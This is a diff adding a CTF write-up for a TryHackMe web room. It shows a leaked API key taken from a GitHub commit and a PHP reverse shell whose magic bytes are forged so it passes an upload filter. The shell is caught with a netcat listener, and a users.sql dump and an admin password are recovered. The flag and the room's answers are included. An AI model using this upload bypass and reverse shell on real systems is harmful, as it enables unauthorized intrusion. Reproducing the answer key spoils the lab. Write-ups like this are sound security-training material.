@@ -351,3 +351,357 @@ if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {
 
     if ($stmt->execute()) {
         echo json_encode(['message' => 'Registration successful.']);
+    } else {
+        echo json_encode(['error' => 'Registration failed: ' . $stmt->error]);
+    }
+    $stmt->close();
+} else {
+    echo json_encode(array('error' => 'Invalid or Expired API key'));
+  }
+
+?>
+
+upload.php
+
+<?php
+session_start();
+require 'config.php';
+$uploadPath = 'uploads/';
+
+function checkMagicBytes($fileTmpPath, $validMagicBytes) {
+    $fileMagicBytes = file_get_contents($fileTmpPath, false, null, 0, 4);
+    return in_array(bin2hex($fileMagicBytes), $validMagicBytes);
+}
+
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
+$validMagicBytes = [
+    'jpg' => 'ffd8ffe0', 
+    'png' => '89504e47', 
+    'bmp' => '424d'
+];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_SESSION['username'])) {
+        if (isset($_FILES['file'])) {
+            $file = $_FILES['file'];
+            $fileName = $file['name'];
+            $fileTmpPath = $file['tmp_name'];
+            $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
+
+            if (checkMagicBytes($fileTmpPath, $validMagicBytes)) {
+                $uploadDestination = $uploadPath . $fileName;
+                move_uploaded_file($fileTmpPath, $uploadDestination);
+
+                echo json_encode(['message' => 'File uploaded successfully.']);
+            } else {
+                echo json_encode(['error' => 'Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed.']);
+            }
+        } else {
+            echo json_encode(['error' => 'No file uploaded.']);
+        }
+    } else {
+        echo json_encode(['error' => 'User not logged in.']);
+    }
+} else {
+    echo json_encode(['error' => 'Unsupported request method.']);
+}
+?>
+
+commits
+
+https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c36493a725bf7db9bdcf6
+
+|   |
+|---|
+|$headers = apache_request_headers();|
+||||
+|||if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {|
+|||if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {|
+
+POST /api/register.php HTTP/1.1
+
+Host: grep.thm
+
+Cookie: PHPSESSID=joctp902ajsb4qu5orldilonaj
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: https://grep.thm/public/html/register.php
+
+Content-Type: application/json
+
+X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39
+
+Origin: https://grep.thm
+
+Content-Length: 76
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+Te: trailers
+
+Connection: close
+
+{"username":"test","password":"test","email":"test@gmail.com","name":"test"}
+
+HTTP/1.1 200 OK
+
+Date: Sun, 20 Aug 2023 18:15:25 GMT
+
+Server: Apache/2.4.41 (Ubuntu)
+
+Content-Length: 38
+
+Connection: close
+
+Content-Type: application/json
+
+{"message":"Registration successful."}
+
+then login
+
+First Flag
+
+THM{4ec9806d7e1350270dc402ba870ccebb}
+
+POST /api/upload.php HTTP/1.1
+
+{"error":"No file uploaded."}
+
+https://grep.thm/api/uploads/
+
+https://grep.thm/public/html/upload.php
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tail payload_ivan.php
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('10.8.19.103', 1337);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>  
+
+{"error":"Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed."}
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cp payload_monkey.php payload_monkey.php.jpg
+
+──(witty㉿kali)-[~/Downloads]
+└─$ head payload_monkey.php.jpg 
+AAAA
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.8.19.103';
+$port = 4444;
+$chunk_size = 1400;
+
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
+$validMagicBytes = [
+    'jpg' => 'ffd8ffe0', 
+    'png' => '89504e47', 
+    'bmp' => '424d'
+];
+
+hexeditor
+
+00000000  FF D8 FF E0  0A 3C 3F 70   68 70 0A 2F  2F 20 70 68     .....
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hexeditor payload_monkey.php.jpg 
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ xxd payload_monkey.php.jpg
+00000000: ffd8 ffe0 0a3c 3f70 6870 0a2f 2f20 7068  .....
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mv payload_monkey.php.jpg payload_monkey_test.php
+
+{"message":"File uploaded successfully."}
+
+https://grep.thm/api/uploads/
+
+revshell
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.78.9] 56996
+Linux ip-10-10-78-9 5.15.0-1038-aws #43~20.04.1-Ubuntu SMP Fri Jun 2 17:10:57 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 19:45:53 up  2:49,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+```
+```text
+$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+www-data@ip-10-10-78-9:/$ ls
+ls
+bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
+boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
+www-data@ip-10-10-78-9:/$ cd /home
+cd /home
+www-data@ip-10-10-78-9:/home$ ls
+ls
+tryhackme  ubuntu
+www-data@ip-10-10-78-9:/home$ cd tryhackme
+cd tryhackme
+www-data@ip-10-10-78-9:/home/tryhackme$ ls
+ls
+www-data@ip-10-10-78-9:/home/tryhackme$ ls -lah
+ls -lah
+total 24K
+drwxr-xr-x 3 tryhackme tryhackme 4.0K Jun 29 08:05 .
+drwxr-xr-x 4 root      root      4.0K Nov 10  2021 ..
+lrwxrwxrwx 1 root      root         9 Nov 10  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 tryhackme tryhackme  220 Nov 10  2021 .bash_logout
+-rw-r--r-- 1 tryhackme tryhackme 3.7K Nov 10  2021 .bashrc
+drwx------ 2 tryhackme tryhackme 4.0K Jun 29 08:05 .cache
+-rw-r--r-- 1 tryhackme tryhackme  807 Nov 10  2021 .profile
+www-data@ip-10-10-78-9:/home/tryhackme$ cd /var/www
+cd /var/www
+www-data@ip-10-10-78-9:/var/www$ ls
+ls
+backup		 html		       private.key
+certificate.crt  leak_certificate.crt  private_unencrypted.key
+certificate.csr  leak_certificate.csr
+default_html	 leakchecker
+www-data@ip-10-10-78-9:/var/www$ cd backup
+cd backup
+www-data@ip-10-10-78-9:/var/www/backup$ ls
+ls
+users.sql
+www-data@ip-10-10-78-9:/var/www/backup$ cat users.sql
+cat users.sql
+-- phpMyAdmin SQL Dump
+-- version 5.2.1
+-- https://www.phpmyadmin.net/
+--
+-- Host: 127.0.0.1
+-- Generation Time: May 30, 2023 at 01:25 PM
+-- Server version: 10.4.28-MariaDB
+-- PHP Version: 8.0.28
+
+SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
+START TRANSACTION;
+SET time_zone = "+00:00";
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8mb4 */;
+
+--
+-- Database: `postman`
+--
+
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `users`
+--
+
+CREATE TABLE `users` (
+  `id` int(11) NOT NULL,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(255) NOT NULL,
+  `email` varchar(100) NOT NULL,
+  `name` varchar(100) DEFAULT NULL,
+  `role` varchar(20) DEFAULT 'user'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+
+--
+-- Dumping data for table `users`
+--
+
+INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
+(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
+(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');
+
+--
+-- Indexes for dumped tables
+--
+
+--
+-- Indexes for table `users`
+--
+ALTER TABLE `users`
+  ADD PRIMARY KEY (`id`),
+  ADD UNIQUE KEY `username` (`username`),
+  ADD UNIQUE KEY `email` (`email`);
+
+--
+-- AUTO_INCREMENT for dumped tables
+--
+
+--
+-- AUTO_INCREMENT for table `users`
+--
+ALTER TABLE `users`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
+COMMIT;
+
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+
+www-data@ip-10-10-78-9:/var/www$ ls
+ls
+backup		 html		       private.key
+certificate.crt  leak_certificate.crt  private_unencrypted.key
+certificate.csr  leak_certificate.csr
+default_html	 leakchecker
+www-data@ip-10-10-78-9:/var/www$ cd leakchecker
+cd leakchecker
+www-data@ip-10-10-78-9:/var/www/leakchecker$ ls
+ls
+check_email.php  index.php
+www-data@ip-10-10-78-9:/var/www/leakchecker$ cat index.php
+cat index.php
+cat: index.php: Permission denied
+www-data@ip-10-10-78-9:/var/www/leakchecker$ cat check_email.php
+cat check_email.php
+cat: check_email.php: Permission denied
+
+https://leakchecker.grep.thm:51337/
+
+Email Leak Checker
+Email: admin@searchme2023cms.grep.thm
+Password: admin_tryhackme!
+```
+![[Pasted image 20230820144608.png]]
+![[Pasted image 20230820145147.png]]
+What is the API key that allows a user to register on the website?
+*ffe60ecaa8bba2f12b43d1a4b15b8f39*
+What is the first flag?
+What is the email of the "admin" user?
+*admin@searchme2023cms.grep.thm*
+What is the host name of the web application that allows a user to check an email for a possible password leak?
+*leakchecker.grep.thm*
+What is the password of the "admin" user?
+*admin_tryhackme! *
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6fadc47083720793a8edb44e29840aa4.png)
+- ***THM{4ec9806d7e1350270dc402ba870ccebb}***
+
+## Notes / Lessons Learned
+[[Undiscovered]]
+
